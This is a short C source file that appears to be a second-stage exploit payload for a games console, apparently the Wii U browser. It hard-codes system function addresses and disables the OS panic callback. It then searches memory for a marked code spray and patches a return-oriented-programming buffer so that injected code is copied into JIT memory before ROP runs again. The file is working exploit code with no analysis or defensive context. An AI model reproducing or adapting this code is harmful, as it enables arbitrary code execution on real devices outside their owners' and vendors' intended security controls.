#define OSFatal ((void (*)(char* msg))0x1031368)
#define __os_snprintf ((int(*)(char* s, int n, const char * format, ... ))0x102f09c)
#define rop ((void (*)(unsigned int r3))0xd8f502c)
#define memcpy ((void * (*)(void * destination, const void * source, int num))0x1035a6c)

#define BUFFER_ADDR 0x1b201814
#define CODE_START	0xCAFECAFE
#define OSPANIC_CB	0x1003AAAC

void start()
{
	/* Set up a different stack */
    asm("stwu %r1,-0x2000(%r1)");

	/* Remove the OSPanic() callback */
	unsigned int *ospanic_cb = (unsigned int*)OSPANIC_CB;
	ospanic_cb[0] = ospanic_cb[1] = 0;

	/* Look for the code buffer */
	unsigned int *codebuf = (unsigned int*)(BUFFER_ADDR+0x96f00);
	while (codebuf < (unsigned int*)0x20000000)
	{
		if (*codebuf == CODE_START) break;
		codebuf++;
	}

	/* Copy another version of the ROP buffer over the original */
	memcpy((void*)BUFFER_ADDR, (void*)BUFFER_ADDR + 0x1000, 0x5c0);

	/* Modify the ROP buffer to copy the code spray into the JIT */
	unsigned int *ropbuf = (unsigned int*)BUFFER_ADDR;
	ropbuf[0x318/4] = &ropbuf[0xa0/4];
	ropbuf[0xdc/4] = codebuf + 1;
	ropbuf[0xe0/4] = 0x8000;

	/* Perform ROP again */
    rop(BUFFER_ADDR + 0x30c);
}
